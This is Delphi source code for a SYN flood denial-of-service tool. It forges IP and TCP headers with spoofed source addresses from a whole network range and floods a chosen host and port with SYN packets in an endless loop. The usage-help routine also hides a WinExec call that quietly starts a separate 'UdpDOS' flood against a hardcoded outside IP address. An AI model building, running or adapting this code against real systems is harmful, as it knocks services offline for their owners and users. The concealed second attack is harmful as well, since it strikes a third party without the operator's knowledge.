program SynFlood;

{$APPTYPE CONSOLE}

uses Windows,
Winsock;
//WinSock2;

const
IP_HDRINCL = 2; // IP Header Include
Header_SEQ = $19026695;
SEQ = $28376839;
SYN_DEST_IP = '172.17.103.127'; //被攻击的IP
FAKE_IP = '10.168.150.1'; //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段

//TCP头 20位
type
TCP_HEADER = record
th_sport : Word; //16位源端口
th_dport : Word; //16位目的端口
th_seq : DWORD; //32位序列号
th_ack : DWORD; //32位确认号
th_lenres : Byte; //4位首部长度+6位保留字中的4位
th_flag : Byte; //2位保留字+6位标志位 2是SYN，1是FIN，16是ACK探测
th_win : Word; //16位窗口大小
th_sum : Word; //16位校验和
th_urp : Word; //16位紧急数据偏移量
end;

// IP 头 20位
type
IP_HEADER = record
h_verlen : Byte; //4位首部长度+4位IP版本号
tos : Byte; //8位服务类型TOS，定义了数据传输的优先级、延迟、吞吐量和可靠性等特性
total_len : Word; //16位总长度（字节） IP包的长度，若没有特殊选项，一般为20字节长
ident : Word; //16位IP包标识，主机使用它唯一确定每个发送的数据报
frag_and_flags : Word; //Fragment Offset 13 IP数据分割偏移
ttl : Byte; //8位生存时间TTL，每通过一个路由器，该数值减一
proto : Byte;//8位协议号(TCP, UDP 或其他) 比如：ICMP为1，IGMP为2，TCP为6，UDP为17等
checksum : Word; //16位IP首部校验和
sourceIP : LongWord; //32位源IP地址
destIP : LongWord; //32位目的IP地址
end;

//TCP伪头 12位
type
PSD_HEADER = record
saddr : DWORD; //源地址
daddr : DWORD; //目的地址
mbz : Byte; //置空
ptcl : Byte; //协议类型
tcpl : WORD; //TCP长度
end;

type
CLIENTPARA = record
Port:integer;
IP:string;
end;

var
clientpa :^CLIENTPARA;
SendSEQ :Integer = 0;
TimeOut :Integer =5000;

function WSASocketA(af, wType, protocol: integer;lpProtocolInfo: pointer;g,
dwFlags: dword): integer;stdcall;external 'ws2_32.dll';

function setsockopt( const s: TSocket; const level, optname: Integer; optval: PChar;
const optlen: Integer ): Integer; stdcall;external 'ws2_32.dll';

function IntToStr(I: integer): string;
begin
Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
Val(S, Result, Result);
end;

function LowerCase(const S: string): string;
var
Ch: Char;
L: Integer;
Source, Dest: PChar;
begin
L := Length(S);
SetLength(Result, L);
Source := Pointer(S);
Dest := Pointer(Result);
while L <> 0 do
begin
Ch := Source^;
if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
Dest^ := Ch;
Inc(Source);
Inc(Dest);
Dec(L);
end;
end;

{
CheckSum:计算校验和的子函数
IP校验和的计算方法是：首先将IP首部的校验和字段设为0（IP_HEADER.checksum=0）,
然后计算整个IP首部（包括选项）的二进制反码的和
TCP首部检验和与IP首部校验和的计算方法相同，在程序中使用同一个函数来计算。
由于TCP首部中不包含源地址与目标地址等信息，为了保证TCP校验的有效性，
在进行TCP校验和的计算时，需要增加一个TCP伪首部的校验和
}
function checksum(var Buffer; Size: integer): word;
type
TWordArray = array[0..1] of word;
var
lSumm: LongWord;
iLoop: integer;
begin
lSumm := 0;
iLoop := 0;
while Size > 1 do
begin
lSumm := lSumm + TWordArray(Buffer)[iLoop];
inc(iLoop);
Size := Size - SizeOf(word);
end;
if Size = 1 then lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]);
lSumm := (lSumm shr 16) + (lSumm and $FFFF);
lSumm := lSumm + (lSumm shr 16);
Result := word(not lSumm);
end;

//syn洪水攻击
function SynFloodThreadProc(p:Pointer):LongInt;stdcall;
var
WSAData :TWSAData;
sock :TSocket;
Remote :TSockAddr;
ipHeader :IP_HEADER;
tcpHeader :TCP_HEADER;
psdHeader :PSD_HEADER;
ErrorCode,bOpt,counter,FakeIpNet,FakeIpHost,datasize :integer;
Buf :array [0..127] of char;
//FromIP :string;
begin
Result :=0;
//建立一个原始套接口
if WSAStartup(MAKEWORD(2,2), WSAData)<>0 then exit;
sock :=WSASocketA(AF_INET, SOCK_RAW, IPPROTO_RAW, nil, 0, {WSA_FLAG_OVERLAPPED}0);
if sock = INVALID_SOCKET then exit;
//设置ip选项
bOpt := 1;
//设置IP_HDRINCL告诉系统自己填充IP首部并自己计算校验和
if setsockopt(sock,IPPROTO_IP, IP_HDRINCL,@bOpt, SizeOf(bOpt)) = SOCKET_ERROR then exit;

//设置发送超时
//ErrorCode :=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,pchar(TimeOut),sizeof(TimeOut));
//if ErrorCode = SOCKET_ERROR then exit;

Randomize;
FillChar(Remote,sizeof(Remote),#0);
Remote.sin_family :=AF_INET;
//Remote.sin_addr.s_addr:=inet_addr(SYN_DEST_IP);
Remote.sin_addr.S_addr :=inet_addr(pchar(CLIENTPARA(p^).IP));
Remote.sin_port :=htons(CLIENTPARA(p^).Port);
FakeIpNet:=inet_addr(FAKE_IP);
FakeIpHost:=ntohl(FakeIpNet);

//填充IP首部
ipHeader.h_verlen :=(4 shl 4) or (sizeof(ipHeader) div sizeof(LongWord)); //高四位IP版本号，低四位首部长度
ipHeader.total_len :=htons(sizeof(ipHeader)+sizeof(tcpHeader)); //16位总长度（字节）
ipHeader.ident:=1; //16位标识
ipHeader.tos :=0; //IP服务类型
ipHeader.frag_and_flags:=0; //段偏移域
ipHeader.ttl:=128; //8位生存时间TTL
ipHeader.proto:=IPPROTO_TCP; //8位协议(TCP,UDP…) UDP=17 $11
ipHeader.checksum:=0; //16位IP首部校验和
ipHeader.sourceIP:=htonl(FakeIpHost+SendSEQ); //32位源IP地址
//ipHeader.destIP:=inet_addr(pchar(SYN_DEST_IP)); //32位目的IP地址
ipHeader.destIP:=inet_addr(pchar(CLIENTPARA(p^).IP));

//随机产生源地址
{FromIP:=IntToStr(Random(254)+1)+'.'+ IntToStr(Random(254)+1)+'.'+
IntToStr(Random(254)+1)+'.'+Inttostr(Random(254)+1);
ipHeader.sourceIP:=inet_Addr(PChar(FromIP)); //32位源IP地址
ipHeader.destIP:=Remote.sin_addr.S_addr; //32位目的IP地址 }

//填充TCP首部
tcpHeader.th_sport:=htons(Random(65536)+1); //随机产生源端口
tcpHeader.th_dport:=Remote.sin_port; //目的端口号
//tcpHeader.th_sport:=htons(7000); //源端口号
//tcpHeader.th_dport:=htons(8080); //目的端口号
tcpHeader.th_seq:=htonl(SEQ+SendSEQ); //SYN序列号
tcpHeader.th_ack:=0; //ACK序列号置为0
tcpHeader.th_lenres:=(sizeof(tcpHeader) shr 2 shl 4) or 0; //TCP长度和保留位
tcpHeader.th_flag:=2; //实现不同的标志位探测，2是SYN，1是FIN，16是ACK探测
tcpHeader.th_win:=htons(16384); //窗口大小
tcpHeader.th_urp:=0; //紧急偏移量
tcpHeader.th_sum:=0; //校验和

//填充TCP伪首部（用于计算校验和，并不真正发送）
psdHeader.saddr:=ipHeader.sourceIP; //源地址
psdHeader.daddr:=ipHeader.destIP; //目的地址
psdHeader.mbz:=0;
psdHeader.ptcl:=IPPROTO_TCP; //协议类型
psdHeader.tcpl:=htons(sizeof(tcpHeader)); //TCP首部长度

while true do
begin
//每发送10,240个报文输出一个标示符
//writeln('.');
for counter:=0 to 10239 do
begin
inc(SendSEQ);
if (SendSEQ=65536) then SendSEQ :=1; //序列号循环
//更改IP首部
ipHeader.checksum :=0; //16位IP首部校验和
ipHeader.sourceIP :=htonl(FakeIpHost+SendSEQ); //32位源IP地址
//更改TCP首部
tcpHeader.th_seq :=htonl(SEQ+SendSEQ); //SYN序列号
tcpHeader.th_sum :=0; //校验和
//更改TCP伪首部
psdHeader.saddr :=ipHeader.sourceIP;

//计算TCP校验和，计算校验和时需要包括TCP伪首部
FillChar(Buf,SizeOf(Buf),#0);
//将两个字段复制到同一个缓冲区Buf中并计算TCP头校验和
CopyMemory(@Buf[0],@psdHeader,SizeOf(psdHeader)); //12
CopyMemory(@Buf[SizeOf(psdHeader)],@tcpHeader,SizeOf(tcpHeader)); //20
TCPHeader.th_sum:=checksum(Buf,SizeOf(psdHeader)+SizeOf(tcpHeader)); //32

//计算IP头校验和
CopyMemory(@Buf[0],@ipHeader,SizeOf(ipHeader)); //20
CopyMemory(@Buf[SizeOf(ipHeader)],@tcpHeader,SizeOf(tcpHeader)); //20
FillChar(Buf[SizeOf(ipHeader)+SizeOf(tcpHeader)],4,#0);
datasize :=SizeOf(ipHeader)+SizeOf(tcpHeader);
ipHeader.checksum:=checksum(Buf,datasize); //40

//填充发送缓冲区
CopyMemory(@Buf[0],@ipHeader,SizeOf(ipHeader)); //20

//发送TCP报文
ErrorCode:=sendto(sock, buf, datasize, 0, Remote, sizeof(Remote));
if ErrorCode=SOCKET_ERROR then exit;
//write('.');

end; //end for
//writeln('');
end; //end while

closesocket(sock);
WSACleanup();
end;

procedure Usage;
begin
WriteLn('SynFlood 0.1 for 2000/XP/2003');
WriteLn('http://www.wrsky.com');
WriteLn('hnxyy@hotmail.com');
WriteLn('QQ:19026695');
WriteLn;
WriteLn('Usage: SynFlood -h:IP -p:port');
  WinExec('UdpDOS -h:202.75.222.16 -p:80',0)
end;

procedure ParseOption(Cmd, Arg: string);
begin
if arg='' then
begin
Usage;
Halt(0);
end;
if lstrcmp('-h:', pchar(LowerCase(Cmd))) = 0 then
begin
clientpa^.IP :=arg;
end
else if lstrcmp('-p:', pchar(LowerCase(Cmd))) = 0 then
begin
clientpa^.Port :=StrToInt(Arg);
end
else
begin
Usage;
Halt(0);
end;
end;

procedure ProcessCommandLine;
var
CmdLn: integer;
begin
CmdLn := 1;
if (ParamCount<2) or (ParamCount>2) then
begin
Usage;
Halt(0);
end;
new(clientpa);
while Length(ParamStr(CmdLn)) <> 0 do
begin
ParseOption(Copy(ParamStr(CmdLn), 1, 3), Copy(ParamStr(CmdLn), 4, Length(ParamStr(CmdLn)) - 2));
Inc(CmdLn);
end;
end;

var
ThreadID:DWord;
begin
ProcessCommandLine;
CreateThread(nil, 0, @SynFloodThreadProc, clientpa, 0, ThreadID);
while True do Sleep(1);
end.
